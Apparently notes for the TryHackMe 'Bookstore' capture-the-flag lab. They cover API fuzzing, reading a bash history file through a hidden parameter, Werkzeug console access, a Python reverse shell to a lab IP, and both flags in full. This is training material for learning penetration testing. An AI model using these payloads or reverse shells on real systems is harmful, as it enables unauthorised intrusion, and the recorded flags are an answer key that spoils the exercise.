#API 

- https://tryhackme.com/room/bookstoreoc

Bookstore is a boot2root CTF machine that teaches a beginner penetration tester basic web enumeration and REST API Fuzzing. Several hints can be found when enumerating the services, the idea is to understand how a vulnerable API can be exploited

` 10.10.108.88 `

`nmap -sS -sV 10.10.108.88`
```
22/ssh 7.6p1 4ubuntu0.3
80/http Apache 2.4.29
5000/http Wekzeug httpd 0.14.1
```

`http://10.10.108.88` Bookstore website
turn on foxyproxy > Books > send to Repeater

we see a base64 comment
```
GY4CANZUEA3TIIBXGAQDOMZAGNQSAMTGEAZGMIBXG4QDONZAG43SAMTFEA3TSIBWMYQDONJAG42CANZVEA3DEIBWGUQDEZJAGYZSANTGEA3GIIBSMYQDONZAGYYSANZUEA3DGIBWHAQDGZRAG43CAM3EEA2TIIBXGQQDGNZAGYZCAN3BEA3TQIBXGUQDOMRAGRQSAMZREA2DS===
```

the `/login.html` has comment : debugger pin is inside sid's bash history file
- username: sid ?

Request: `username=admin&pass=pass `
Response: 
- `ETag: "14cd-5b20a11774700-gzip" `

Target >Site map
```
http://10.10.108.88:5000
API > v2 > resources > books > random4

/api/v2/resources/books/all (Retrieve all books and get the output in a json format)

/api/v2/resources/books/random4 (Retrieve 4 random records)

/api/v2/resources/books?id=1(Search by a specific parameter , id parameter)

/api/v2/resources/books?author=J.K. Rowling (Search by a specific parameter, this query will return all the books with author=J.K. Rowling)

/api/v2/resources/books?published=1993 (This query will return all the books published in the year 1993)

/api/v2/resources/books?author=J.K. Rowling&published=2003 (Search by a combination of 2 or more parameters)
```

```
wfuzz -u http://10.10.108.88:5000/api/v1/resources/books?FUZZ=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404

---
200 show
200 author
200 id
200 published

http://10.10.108.88:5000/api/v1/resources/books?show=.bash_history

--- shows
cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit 

http://10.10.108.88:5000/console
123-321-135

-- interactive console

reverse shell generator (revshells.com)
nc -lvnp 9001  (paste in terminal tab)

---- copy & paste in console ---
import socket,
subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.142.18",9001));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
-----
not used:(python3 -c "import pty;pty.spawn('/bin/bash')")

terminal tab shows shell
ls
api.py  api-up.sh  books.db  try-harder  user.txt

cat user.txt
4ea65eb80ed441adb68246ddf7b964ab

ls -la
file try-harder   = ELF
./try-harder
1000              incorrect Try Harder

-rwsrwsr- root sid try-harder

- - - - - - - [make server, get try-harder] - - - -
python3 -m http.server 8080
wget http://IP:8080/try-harder;chmod +x try-harder

upload file to ghidra
- - - - - - - - - - - - - - - - - - - - - - - - - 

1573743953

cd /
cd root/
ls
cat root.txt

e29b05fba5b2a7e69c24a450893158e3

```

user flag
- ` 4ea65eb80ed441adb68246ddf7b964ab `

root flag
- ` e29b05fba5b2a7e69c24a450893158e3 `

---

- https://siunam321.github.io/ctf/tryhackme/Bookstore/
- https://medium.com/@nezekaforcox1/midterm-bookstore-room-e30e4a1592c7
- https://arz101.medium.com/tryhackme-bookstore-9290e5769b0a